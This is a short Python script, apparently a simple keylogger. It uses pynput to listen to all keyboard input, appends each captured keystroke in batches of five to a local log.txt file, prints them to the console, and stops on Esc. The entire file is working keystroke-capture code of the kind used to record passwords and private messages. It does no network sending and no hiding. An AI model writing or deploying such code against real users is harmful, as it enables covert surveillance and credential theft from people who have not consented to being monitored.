import pynput
from pynput.keyboard import Key, Listener

def on_press(key):

    global keys, count
    
    keys.append(key)
    count += 1

    if count >= 5:
        count = 0
        print(keys)
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False # Break out of loop if esc key is pressed

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            f.write(str(key))
    
count = 0
keys = []

with Listener(on_press=on_press, on_release = on_release) as listener:
    listener.join()


